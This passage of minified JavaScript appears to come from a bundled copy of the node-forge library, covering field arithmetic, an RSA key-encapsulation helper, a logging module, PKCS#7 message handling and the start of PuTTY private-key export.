le(U,G){ae(U,G,G)}function ae(U,G,Z){var j,Y,se=0,ne=0,Te=0,Re=0,$e=0,Ae=0,De=0,Le=0,it=0,nt=0,ct=0,St=0,zt=0,Q=0,z=0,H=0,ie=0,pe=0,we=0,_e=0,et=0,yt=0,Ye=0,$t=0,xt=0,Mt=0,Pr=0,Ur=0,Vt=0,jr=0,Br=0,Ct=Z[0],er=Z[1],tr=Z[2],mt=Z[3],or=Z[4],ar=Z[5],It=Z[6],cr=Z[7],lr=Z[8],At=Z[9],rr=Z[10],Kt=Z[11],wt=Z[12],ir=Z[13],ur=Z[14],Tt=Z[15];j=G[0],se+=j*Ct,ne+=j*er,Te+=j*tr,Re+=j*mt,$e+=j*or,Ae+=j*ar,De+=j*It,Le+=j*cr,it+=j*lr,nt+=j*At,ct+=j*rr,St+=j*Kt,zt+=j*wt,Q+=j*ir,z+=j*ur,H+=j*Tt,j=G[1],ne+=j*Ct,Te+=j*er,Re+=j*tr,$e+=j*mt,Ae+=j*or,De+=j*ar,Le+=j*It,it+=j*cr,nt+=j*lr,ct+=j*At,St+=j*rr,zt+=j*Kt,Q+=j*wt,z+=j*ir,H+=j*ur,ie+=j*Tt,j=G[2],Te+=j*Ct,Re+=j*er,$e+=j*tr,Ae+=j*mt,De+=j*or,Le+=j*ar,it+=j*It,nt+=j*cr,ct+=j*lr,St+=j*At,zt+=j*rr,Q+=j*Kt,z+=j*wt,H+=j*ir,ie+=j*ur,pe+=j*Tt,j=G[3],Re+=j*Ct,$e+=j*er,Ae+=j*tr,De+=j*mt,Le+=j*or,it+=j*ar,nt+=j*It,ct+=j*cr,St+=j*lr,zt+=j*At,Q+=j*rr,z+=j*Kt,H+=j*wt,ie+=j*ir,pe+=j*ur,we+=j*Tt,j=G[4],$e+=j*Ct,Ae+=j*er,De+=j*tr,Le+=j*mt,it+=j*or,nt+=j*ar,ct+=j*It,St+=j*cr,zt+=j*lr,Q+=j*At,z+=j*rr,H+=j*Kt,ie+=j*wt,pe+=j*ir,we+=j*ur,_e+=j*Tt,j=G[5],Ae+=j*Ct,De+=j*er,Le+=j*tr,it+=j*mt,nt+=j*or,ct+=j*ar,St+=j*It,zt+=j*cr,Q+=j*lr,z+=j*At,H+=j*rr,ie+=j*Kt,pe+=j*wt,we+=j*ir,_e+=j*ur,et+=j*Tt,j=G[6],De+=j*Ct,Le+=j*er,it+=j*tr,nt+=j*mt,ct+=j*or,St+=j*ar,zt+=j*It,Q+=j*cr,z+=j*lr,H+=j*At,ie+=j*rr,pe+=j*Kt,we+=j*wt,_e+=j*ir,et+=j*ur,yt+=j*Tt,j=G[7],Le+=j*Ct,it+=j*er,nt+=j*tr,ct+=j*mt,St+=j*or,zt+=j*ar,Q+=j*It,z+=j*cr,H+=j*lr,ie+=j*At,pe+=j*rr,we+=j*Kt,_e+=j*wt,et+=j*ir,yt+=j*ur,Ye+=j*Tt,j=G[8],it+=j*Ct,nt+=j*er,ct+=j*tr,St+=j*mt,zt+=j*or,Q+=j*ar,z+=j*It,H+=j*cr,ie+=j*lr,pe+=j*At,we+=j*rr,_e+=j*Kt,et+=j*wt,yt+=j*ir,Ye+=j*ur,$t+=j*Tt,j=G[9],nt+=j*Ct,ct+=j*er,St+=j*tr,zt+=j*mt,Q+=j*or,z+=j*ar,H+=j*It,ie+=j*cr,pe+=j*lr,we+=j*At,_e+=j*rr,et+=j*Kt,yt+=j*wt,Ye+=j*ir,$t+=j*ur,xt+=j*Tt,j=G[10],ct+=j*Ct,St+=j*er,zt+=j*tr,Q+=j*mt,z+=j*or,H+=j*ar,ie+=j*It,pe+=j*cr,we+=j*lr,_e+=j*At,et+=j*rr,yt+=j*Kt,Ye+=j*wt,$t+=j*ir,xt+=j*ur,Mt+=j*Tt,j=G[11],St+=j*Ct,zt+=j*er,Q+=j*tr,z+=j*mt,H+=j*or,ie+=j*ar,pe+=j*It,we+=j*cr,_e+=j*lr,et+=j*At,yt+=j*rr,Ye+=j*Kt,$t+=j*wt,xt+=j*ir,Mt+=j*ur,Pr+=j*Tt,j=G[12],zt+=j*Ct,Q+=j*er,z+=j*tr,H+=j*mt,ie+=j*or,pe+=j*ar,we+=j*It,_e+=j*cr,et+=j*lr,yt+=j*At,Ye+=j*rr,$t+=j*Kt,xt+=j*wt,Mt+=j*ir,Pr+=j*ur,Ur+=j*Tt,j=G[13],Q+=j*Ct,z+=j*er,H+=j*tr,ie+=j*mt,pe+=j*or,we+=j*ar,_e+=j*It,et+=j*cr,yt+=j*lr,Ye+=j*At,$t+=j*rr,xt+=j*Kt,Mt+=j*wt,Pr+=j*ir,Ur+=j*ur,Vt+=j*Tt,j=G[14],z+=j*Ct,H+=j*er,ie+=j*tr,pe+=j*mt,we+=j*or,_e+=j*ar,et+=j*It,yt+=j*cr,Ye+=j*lr,$t+=j*At,xt+=j*rr,Mt+=j*Kt,Pr+=j*wt,Ur+=j*ir,Vt+=j*ur,jr+=j*Tt,j=G[15],H+=j*Ct,ie+=j*er,pe+=j*tr,we+=j*mt,_e+=j*or,et+=j*ar,yt+=j*It,Ye+=j*cr,$t+=j*lr,xt+=j*At,Mt+=j*rr,Pr+=j*Kt,Ur+=j*wt,Vt+=j*ir,jr+=j*ur,Br+=j*Tt,se+=38*ie,ne+=38*pe,Te+=38*we,Re+=38*_e,$e+=38*et,Ae+=38*yt,De+=38*Ye,Le+=38*$t,it+=38*xt,nt+=38*Mt,ct+=38*Pr,St+=38*Ur,zt+=38*Vt,Q+=38*jr,z+=38*Br,Y=1,j=se+Y+65535,Y=Math.floor(j/65536),se=j-Y*65536,j=ne+Y+65535,Y=Math.floor(j/65536),ne=j-Y*65536,j=Te+Y+65535,Y=Math.floor(j/65536),Te=j-Y*65536,j=Re+Y+65535,Y=Math.floor(j/65536),Re=j-Y*65536,j=$e+Y+65535,Y=Math.floor(j/65536),$e=j-Y*65536,j=Ae+Y+65535,Y=Math.floor(j/65536),Ae=j-Y*65536,j=De+Y+65535,Y=Math.floor(j/65536),De=j-Y*65536,j=Le+Y+65535,Y=Math.floor(j/65536),Le=j-Y*65536,j=it+Y+65535,Y=Math.floor(j/65536),it=j-Y*65536,j=nt+Y+65535,Y=Math.floor(j/65536),nt=j-Y*65536,j=ct+Y+65535,Y=Math.floor(j/65536),ct=j-Y*65536,j=St+Y+65535,Y=Math.floor(j/65536),St=j-Y*65536,j=zt+Y+65535,Y=Math.floor(j/65536),zt=j-Y*65536,j=Q+Y+65535,Y=Math.floor(j/65536),Q=j-Y*65536,j=z+Y+65535,Y=Math.floor(j/65536),z=j-Y*65536,j=H+Y+65535,Y=Math.floor(j/65536),H=j-Y*65536,se+=Y-1+37*(Y-1),Y=1,j=se+Y+65535,Y=Math.floor(j/65536),se=j-Y*65536,j=ne+Y+65535,Y=Math.floor(j/65536),ne=j-Y*65536,j=Te+Y+65535,Y=Math.floor(j/65536),Te=j-Y*65536,j=Re+Y+65535,Y=Math.floor(j/65536),Re=j-Y*65536,j=$e+Y+65535,Y=Math.floor(j/65536),$e=j-Y*65536,j=Ae+Y+65535,Y=Math.floor(j/65536),Ae=j-Y*65536,j=De+Y+65535,Y=Math.floor(j/65536),De=j-Y*65536,j=Le+Y+65535,Y=Math.floor(j/65536),Le=j-Y*65536,j=it+Y+65535,Y=Math.floor(j/65536),it=j-Y*65536,j=nt+Y+65535,Y=Math.floor(j/65536),nt=j-Y*65536,j=ct+Y+65535,Y=Math.floor(j/65536),ct=j-Y*65536,j=St+Y+65535,Y=Math.floor(j/65536),St=j-Y*65536,j=zt+Y+65535,Y=Math.floor(j/65536),zt=j-Y*65536,j=Q+Y+65535,Y=Math.floor(j/65536),Q=j-Y*65536,j=z+Y+65535,Y=Math.floor(j/65536),z=j-Y*65536,j=H+Y+65535,Y=Math.floor(j/65536),H=j-Y*65536,se+=Y-1+37*(Y-1),U[0]=se,U[1]=ne,U[2]=Te,U[3]=Re,U[4]=$e,U[5]=Ae,U[6]=De,U[7]=Le,U[8]=it,U[9]=nt,U[10]=ct,U[11]=St,U[12]=zt,U[13]=Q,U[14]=z,U[15]=H}return H_}var V_,iL;function Ipe(){if(iL)return V_;iL=1;var r=Lr();Ei(),Au(),Yx(),V_=r.kem=r.kem||{};var e=r.jsbn.BigInteger;r.kem.rsa={},r.kem.rsa.create=function(i,n){n=n||{};var s=n.prng||r.random,o={};return o.encrypt=function(a,c){var l=Math.ceil(a.n.bitLength()/8),u;do u=new e(r.util.bytesToHex(s.getBytesSync(l)),16).mod(a.n);while(u.compareTo(e.ONE)<=0);u=r.util.hexToBytes(u.toString(16));var d=l-u.length;d>0&&(u=r.util.fillString("\0",d)+u);var h=a.encrypt(u,"NONE"),f=i.generate(u,c);return{encapsulation:h,key:f}},o.decrypt=function(a,c,l){var u=a.decrypt(c,"NONE");return i.generate(u,l)},o},r.kem.kdf1=function(i,n){t(this,i,0,n||i.digestLength)},r.kem.kdf2=function(i,n){t(this,i,1,n||i.digestLength)};function t(i,n,s,o){i.generate=function(a,c){for(var l=new r.util.ByteBuffer,u=Math.ceil(c/o)+s,d=new r.util.ByteBuffer,h=s;h<u;++h){d.putInt32(h),n.start(),n.update(a+d.getBytes());var f=n.digest();l.putBytes(f.getBytes(o))}return l.truncate(l.length()-c),l.getBytes()}}return V_}var K_,nL;function Tpe(){if(nL)return K_;nL=1;var r=Lr();Ei(),K_=r.log=r.log||{},r.log.levels=["none","error","warning","info","debug","verbose","max"];var e={},t=[],i=null;r.log.LEVEL_LOCKED=2,r.log.NO_LEVEL_CHECK=4,r.log.INTERPOLATE=8;for(var n=0;n<r.log.levels.length;++n){var s=r.log.levels[n];e[s]={index:n,name:s.toUpperCase()}}r.log.logMessage=function(h){for(var f=e[h.level].index,p=0;p<t.length;++p){var g=t[p];if(g.flags&r.log.NO_LEVEL_CHECK)g.f(h);else{var w=e[g.level].index;f<=w&&g.f(g,h)}}},r.log.prepareStandard=function(h){"standard"in h||(h.standard=e[h.level].name+" ["+h.category+"] "+h.message)},r.log.prepareFull=function(h){if(!("full"in h)){var f=[h.message];f=f.concat([]),h.full=r.util.format.apply(this,f)}},r.log.prepareStandardFull=function(h){"standardFull"in h||(r.log.prepareStandard(h),h.standardFull=h.standard)};for(var o=["error","warning","info","debug","verbose"],n=0;n<o.length;++n)(function(f){r.log[f]=function(p,g){var w=Array.prototype.slice.call(arguments).slice(2),m={timestamp:new Date,level:f,category:p,message:g,arguments:w};r.log.logMessage(m)}})(o[n]);if(r.log.makeLogger=function(h){var f={flags:0,f:h};return r.log.setLevel(f,"none"),f},r.log.setLevel=function(h,f){var p=!1;if(h&&!(h.flags&r.log.LEVEL_LOCKED))for(var g=0;g<r.log.levels.length;++g){var w=r.log.levels[g];if(f==w){h.level=f,p=!0;break}}return p},r.log.lock=function(h,f){typeof f>"u"||f?h.flags|=r.log.LEVEL_LOCKED:h.flags&=~r.log.LEVEL_LOCKED},r.log.addLogger=function(h){t.push(h)},typeof console<"u"&&"log"in console){var a;if(console.error&&console.warn&&console.info&&console.debug){var c={error:console.error,warning:console.warn,info:console.info,debug:console.debug,verbose:console.debug},l=function(h,f){r.log.prepareStandard(f);var p=c[f.level],g=[f.standard];g=g.concat(f.arguments.slice()),p.apply(console,g)};a=r.log.makeLogger(l)}else{var l=function(f,p){r.log.prepareStandardFull(p),console.log(p.standardFull)};a=r.log.makeLogger(l)}r.log.setLevel(a,"debug"),r.log.addLogger(a),i=a}else console={log:function(){}};if(i!==null&&typeof window<"u"&&window.location){var u=new URL(window.location.href).searchParams;if(u.has("console.level")&&r.log.setLevel(i,u.get("console.level").slice(-1)[0]),u.has("console.lock")){var d=u.get("console.lock").slice(-1)[0];d=="true"&&r.log.lock(i)}}return r.log.consoleLogger=i,K_}var G_,sL;function kpe(){return sL||(sL=1,G_=I0(),z$(),i4(),hJ(),EJ()),G_}var Z_={exports:{}},oL;function Npe(){if(oL)return Z_.exports;oL=1;var r=Lr();Xg(),Yd(),Zx(),e2(),E3(),bJ(),Au(),Ei(),V$();var e=r.asn1,t=Z_.exports=r.pkcs7=r.pkcs7||{};t.messageFromPem=function(f){var p=r.pem.decode(f)[0];if(p.type!=="PKCS7"){var g=new Error('Could not convert PKCS#7 message from PEM; PEM header type is not "PKCS#7".');throw g.headerType=p.type,g}if(p.procType&&p.procType.type==="ENCRYPTED")throw new Error("Could not convert PKCS#7 message from PEM; PEM is encrypted.");var w=e.fromDer(p.body);return t.messageFromAsn1(w)},t.messageToPem=function(f,p){var g={type:"PKCS7",body:e.toDer(f.toAsn1()).getBytes()};return r.pem.encode(g,{maxline:p})},t.messageFromAsn1=function(f){var p={},g=[];if(!e.validate(f,t.asn1.contentInfoValidator,p,g)){var w=new Error("Cannot read PKCS#7 message. ASN.1 object is not an PKCS#7 ContentInfo.");throw w.errors=g,w}var m=e.derToOid(p.contentType),x;switch(m){case r.pki.oids.envelopedData:x=t.createEnvelopedData();break;case r.pki.oids.encryptedData:x=t.createEncryptedData();break;case r.pki.oids.signedData:x=t.createSignedData();break;default:throw new Error("Cannot read PKCS#7 message. ContentType with OID "+m+" is not (yet) supported.")}return x.fromAsn1(p.content.value[0]),x},t.createSignedData=function(){var f=null;return f={type:r.pki.oids.signedData,version:1,certificates:[],crls:[],signers:[],digestAlgorithmIdentifiers:[],contentInfo:null,signerInfos:[],fromAsn1:function(w){if(d(f,w,t.asn1.signedDataValidator),f.certificates=[],f.crls=[],f.digestAlgorithmIdentifiers=[],f.contentInfo=null,f.signerInfos=[],f.rawCapture.certificates)for(var m=f.rawCapture.certificates.value,x=0;x<m.length;++x)f.certificates.push(r.pki.certificateFromAsn1(m[x]))},toAsn1:function(){f.contentInfo||f.sign();for(var w=[],m=0;m<f.certificates.length;++m)w.push(r.pki.certificateToAsn1(f.certificates[m]));var x=[],S=e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(f.version).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SET,!0,f.digestAlgorithmIdentifiers),f.contentInfo])]);return w.length>0&&S.value[0].value.push(e.create(e.Class.CONTEXT_SPECIFIC,0,!0,w)),x.length>0&&S.value[0].value.push(e.create(e.Class.CONTEXT_SPECIFIC,1,!0,x)),S.value[0].value.push(e.create(e.Class.UNIVERSAL,e.Type.SET,!0,f.signerInfos)),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(f.type).getBytes()),S])},addSigner:function(w){var m=w.issuer,x=w.serialNumber;if(w.certificate){var S=w.certificate;typeof S=="string"&&(S=r.pki.certificateFromPem(S)),m=S.issuer.attributes,x=S.serialNumber}var T=w.key;if(!T)throw new Error("Could not add PKCS#7 signer; no private key specified.");typeof T=="string"&&(T=r.pki.privateKeyFromPem(T));var k=w.digestAlgorithm||r.pki.oids.sha1;switch(k){case r.pki.oids.sha1:case r.pki.oids.sha256:case r.pki.oids.sha384:case r.pki.oids.sha512:case r.pki.oids.md5:break;default:throw new Error("Could not add PKCS#7 signer; unknown message digest algorithm: "+k)}var I=w.authenticatedAttributes||[];if(I.length>0){for(var E=!1,C=!1,N=0;N<I.length;++N){var L=I[N];if(!E&&L.type===r.pki.oids.contentType){if(E=!0,C)break;continue}if(!C&&L.type===r.pki.oids.messageDigest){if(C=!0,E)break;continue}}if(!E||!C)throw new Error("Invalid signer.authenticatedAttributes. If signer.authenticatedAttributes is specified, then it must contain at least two attributes, PKCS #9 content-type and PKCS #9 message-digest.")}f.signers.push({key:T,version:1,issuer:m,serialNumber:x,digestAlgorithm:k,signatureAlgorithm:r.pki.oids.rsaEncryption,signature:null,authenticatedAttributes:I,unauthenticatedAttributes:[]})},sign:function(w){if(w=w||{},(typeof f.content!="object"||f.contentInfo===null)&&(f.contentInfo=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(r.pki.oids.data).getBytes())]),"content"in f)){var m;f.content instanceof r.util.ByteBuffer?m=f.content.bytes():typeof f.content=="string"&&(m=r.util.encodeUtf8(f.content)),w.detached?f.detachedContent=e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,m):f.contentInfo.value.push(e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,m)]))}if(f.signers.length!==0){var x=p();g(x)}},verify:function(){throw new Error("PKCS#7 signature verification not yet implemented.")},addCertificate:function(w){typeof w=="string"&&(w=r.pki.certificateFromPem(w)),f.certificates.push(w)},addCertificateRevokationList:function(w){throw new Error("PKCS#7 CRL support not yet implemented.")}},f;function p(){for(var w={},m=0;m<f.signers.length;++m){var x=f.signers[m],S=x.digestAlgorithm;S in w||(w[S]=r.md[r.pki.oids[S]].create()),x.authenticatedAttributes.length===0?x.md=w[S]:x.md=r.md[r.pki.oids[S]].create()}f.digestAlgorithmIdentifiers=[];for(var S in w)f.digestAlgorithmIdentifiers.push(e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(S).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.NULL,!1,"")]));return w}function g(w){var m;if(f.detachedContent?m=f.detachedContent:(m=f.contentInfo.value[1],m=m.value[0]),!m)throw new Error("Could not sign PKCS#7 message; there is no content to sign.");var x=e.derToOid(f.contentInfo.value[0].value),S=e.toDer(m);S.getByte(),e.getBerValueLength(S),S=S.getBytes();for(var T in w)w[T].start().update(S);for(var k=new Date,I=0;I<f.signers.length;++I){var E=f.signers[I];if(E.authenticatedAttributes.length===0){if(x!==r.pki.oids.data)throw new Error("Invalid signer; authenticatedAttributes must be present when the ContentInfo content type is not PKCS#7 Data.")}else{E.authenticatedAttributesAsn1=e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[]);for(var C=e.create(e.Class.UNIVERSAL,e.Type.SET,!0,[]),N=0;N<E.authenticatedAttributes.length;++N){var L=E.authenticatedAttributes[N];L.type===r.pki.oids.messageDigest?L.value=w[E.digestAlgorithm].digest():L.type===r.pki.oids.signingTime&&(L.value||(L.value=k)),C.value.push(l(L)),E.authenticatedAttributesAsn1.value.push(l(L))}S=e.toDer(C).getBytes(),E.md.start().update(S)}E.signature=E.key.sign(E.md,"RSASSA-PKCS1-V1_5")}f.signerInfos=c(f.signers)}},t.createEncryptedData=function(){var f=null;return f={type:r.pki.oids.encryptedData,version:0,encryptedContent:{algorithm:r.pki.oids["aes256-CBC"]},fromAsn1:function(p){d(f,p,t.asn1.encryptedDataValidator)},decrypt:function(p){p!==void 0&&(f.encryptedContent.key=p),h(f)}},f},t.createEnvelopedData=function(){var f=null;return f={type:r.pki.oids.envelopedData,version:0,recipients:[],encryptedContent:{algorithm:r.pki.oids["aes256-CBC"]},fromAsn1:function(p){var g=d(f,p,t.asn1.envelopedDataValidator);f.recipients=s(g.recipientInfos.value)},toAsn1:function(){return e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(f.type).getBytes()),e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(f.version).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SET,!0,o(f.recipients)),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,u(f.encryptedContent))])])])},findRecipient:function(p){for(var g=p.issuer.attributes,w=0;w<f.recipients.length;++w){var m=f.recipients[w],x=m.issuer;if(m.serialNumber===p.serialNumber&&x.length===g.length){for(var S=!0,T=0;T<g.length;++T)if(x[T].type!==g[T].type||x[T].value!==g[T].value){S=!1;break}if(S)return m}}return null},decrypt:function(p,g){if(f.encryptedContent.key===void 0&&p!==void 0&&g!==void 0)switch(p.encryptedContent.algorithm){case r.pki.oids.rsaEncryption:case r.pki.oids.desCBC:var w=g.decrypt(p.encryptedContent.content);f.encryptedContent.key=r.util.createBuffer(w);break;default:throw new Error("Unsupported asymmetric cipher, OID "+p.encryptedContent.algorithm)}h(f)},addRecipient:function(p){f.recipients.push({version:0,issuer:p.issuer.attributes,serialNumber:p.serialNumber,encryptedContent:{algorithm:r.pki.oids.rsaEncryption,key:p.publicKey}})},encrypt:function(p,g){if(f.encryptedContent.content===void 0){g=g||f.encryptedContent.algorithm,p=p||f.encryptedContent.key;var w,m,x;switch(g){case r.pki.oids["aes128-CBC"]:w=16,m=16,x=r.aes.createEncryptionCipher;break;case r.pki.oids["aes192-CBC"]:w=24,m=16,x=r.aes.createEncryptionCipher;break;case r.pki.oids["aes256-CBC"]:w=32,m=16,x=r.aes.createEncryptionCipher;break;case r.pki.oids["des-EDE3-CBC"]:w=24,m=8,x=r.des.createEncryptionCipher;break;default:throw new Error("Unsupported symmetric cipher, OID "+g)}if(p===void 0)p=r.util.createBuffer(r.random.getBytes(w));else if(p.length()!=w)throw new Error("Symmetric key has wrong length; got "+p.length()+" bytes, expected "+w+".");f.encryptedContent.algorithm=g,f.encryptedContent.key=p,f.encryptedContent.parameter=r.util.createBuffer(r.random.getBytes(m));var S=x(p);if(S.start(f.encryptedContent.parameter.copy()),S.update(f.content),!S.finish())throw new Error("Symmetric encryption failed.");f.encryptedContent.content=S.output}for(var T=0;T<f.recipients.length;++T){var k=f.recipients[T];if(k.encryptedContent.content===void 0)switch(k.encryptedContent.algorithm){case r.pki.oids.rsaEncryption:k.encryptedContent.content=k.encryptedContent.key.encrypt(f.encryptedContent.key.data);break;default:throw new Error("Unsupported asymmetric cipher, OID "+k.encryptedContent.algorithm)}}}},f};function i(f){var p={},g=[];if(!e.validate(f,t.asn1.recipientInfoValidator,p,g)){var w=new Error("Cannot read PKCS#7 RecipientInfo. ASN.1 object is not an PKCS#7 RecipientInfo.");throw w.errors=g,w}return{version:p.version.charCodeAt(0),issuer:r.pki.RDNAttributesAsArray(p.issuer),serialNumber:r.util.createBuffer(p.serial).toHex(),encryptedContent:{algorithm:e.derToOid(p.encAlgorithm),parameter:p.encParameter?p.encParameter.value:void 0,content:p.encKey}}}function n(f){return e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(f.version).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[r.pki.distinguishedNameToAsn1({attributes:f.issuer}),e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,r.util.hexToBytes(f.serialNumber))]),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(f.encryptedContent.algorithm).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.NULL,!1,"")]),e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,f.encryptedContent.content)])}function s(f){for(var p=[],g=0;g<f.length;++g)p.push(i(f[g]));return p}function o(f){for(var p=[],g=0;g<f.length;++g)p.push(n(f[g]));return p}function a(f){var p=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(f.version).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[r.pki.distinguishedNameToAsn1({attributes:f.issuer}),e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,r.util.hexToBytes(f.serialNumber))]),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(f.digestAlgorithm).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.NULL,!1,"")])]);if(f.authenticatedAttributesAsn1&&p.value.push(f.authenticatedAttributesAsn1),p.value.push(e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(f.signatureAlgorithm).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.NULL,!1,"")])),p.value.push(e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,f.signature)),f.unauthenticatedAttributes.length>0){for(var g=e.create(e.Class.CONTEXT_SPECIFIC,1,!0,[]),w=0;w<f.unauthenticatedAttributes.length;++w){var m=f.unauthenticatedAttributes[w];g.values.push(l(m))}p.value.push(g)}return p}function c(f){for(var p=[],g=0;g<f.length;++g)p.push(a(f[g]));return p}function l(f){var p;if(f.type===r.pki.oids.contentType)p=e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(f.value).getBytes());else if(f.type===r.pki.oids.messageDigest)p=e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,f.value.bytes());else if(f.type===r.pki.oids.signingTime){var g=new Date("1950-01-01T00:00:00Z"),w=new Date("2050-01-01T00:00:00Z"),m=f.value;if(typeof m=="string"){var x=Date.parse(m);isNaN(x)?m.length===13?m=e.utcTimeToDate(m):m=e.generalizedTimeToDate(m):m=new Date(x)}m>=g&&m<w?p=e.create(e.Class.UNIVERSAL,e.Type.UTCTIME,!1,e.dateToUtcTime(m)):p=e.create(e.Class.UNIVERSAL,e.Type.GENERALIZEDTIME,!1,e.dateToGeneralizedTime(m))}return e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(f.type).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SET,!0,[p])])}function u(f){return[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(r.pki.oids.data).getBytes()),e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(f.algorithm).getBytes()),f.parameter?e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,f.parameter.getBytes()):void 0]),e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,f.content.getBytes())])]}function d(f,p,g){var w={},m=[];if(!e.validate(p,g,w,m)){var x=new Error("Cannot read PKCS#7 message. ASN.1 object is not a supported PKCS#7 message.");throw x.errors=x,x}var S=e.derToOid(w.contentType);if(S!==r.pki.oids.data)throw new Error("Unsupported PKCS#7 message. Only wrapped ContentType Data supported.");if(w.encryptedContent){var T="";if(r.util.isArray(w.encryptedContent))for(var k=0;k<w.encryptedContent.length;++k){if(w.encryptedContent[k].type!==e.Type.OCTETSTRING)throw new Error("Malformed PKCS#7 message, expecting encrypted content constructed of only OCTET STRING objects.");T+=w.encryptedContent[k].value}else T=w.encryptedContent;f.encryptedContent={algorithm:e.derToOid(w.encAlgorithm),parameter:r.util.createBuffer(w.encParameter.value),content:r.util.createBuffer(T)}}if(w.content){var T="";if(r.util.isArray(w.content))for(var k=0;k<w.content.length;++k){if(w.content[k].type!==e.Type.OCTETSTRING)throw new Error("Malformed PKCS#7 message, expecting content constructed of only OCTET STRING objects.");T+=w.content[k].value}else T=w.content;f.content=r.util.createBuffer(T)}return f.version=w.version.charCodeAt(0),f.rawCapture=w,w}function h(f){if(f.encryptedContent.key===void 0)throw new Error("Symmetric key not available.");if(f.content===void 0){var p;switch(f.encryptedContent.algorithm){case r.pki.oids["aes128-CBC"]:case r.pki.oids["aes192-CBC"]:case r.pki.oids["aes256-CBC"]:p=r.aes.createDecryptionCipher(f.encryptedContent.key);break;case r.pki.oids.desCBC:case r.pki.oids["des-EDE3-CBC"]:p=r.des.createDecryptionCipher(f.encryptedContent.key);break;default:throw new Error("Unsupported symmetric cipher, OID "+f.encryptedContent.algorithm)}if(p.start(f.encryptedContent.parameter),p.update(f.encryptedContent.content),!p.finish())throw new Error("Symmetric decryption failed.");f.content=p.output}}return Z_.exports}var Y_={exports:{}},aL;function Ppe(){if(aL)return Y_.exports;aL=1;var r=Lr();Xg(),r4(),z$(),i4(),Ei();var e=Y_.exports=r.ssh=r.ssh||{};e.privateKeyToPutty=function(s,o,a){a=a||"",o=o||"";var c="ssh-rsa",l=o===""?"none":"aes256-cbc",u="PuTTY-User-Key-File-2: "+c+`\r
`;u+="Encryption: "+l+`\r
`,u+="Comment: "+a+`\r
`;var d=r.util.createBuffer();i(d,c),t(d,s.e),t(d,s.n);var h=r.util.encode64(d.bytes(),64),f=Math.floor(h.length/66)+1;u+="Public-Lines: "+f+`\r
`,u+=h;var p=r.util.createBuffer();t(p,s.d),t(p,s.p),t(p,s.q),t(p,s.qInv);var g;if(!o)g=r.util.encode64(p.bytes(),64);else{var w=p.length()+16-1;w-=w%16;var m=n(p.bytes());m.truncate(m.length()-w+p.length()),p.putBuffer(m);var x=r.util.createBuffer();x.putBuffer(n("\0\0\0\0",o)),x.putBuffer(n("\0\0\0",o));var S=r.aes.createEncryptionCipher(x.truncate(8),"CBC");S.start(r.util.createBuffer().fillWithByte(0,16)),S.update(p.copy()),S.finish();var T=S.output;T.truncate(16),g=r.util.encode64(T.bytes(),64)}f=Math.floor(g.length/66)+1,u+=`\r
Private-Lines: `+f+`\r
`,u+=g;var k=n("putty-private-key-file-mac-key",o),I=r.util.createBuffer();i(I,c),i(I,l),i(I,a),I.putInt32(d.length()),I.putBuffer(d),I.putInt32(p.length()),I.putBuffer(p);var E=r.hmac.create();return E.start("sha1",k),E.update(I.bytes()),u+=`\r
Private-MAC: `+E.digest().toHex()+`\r
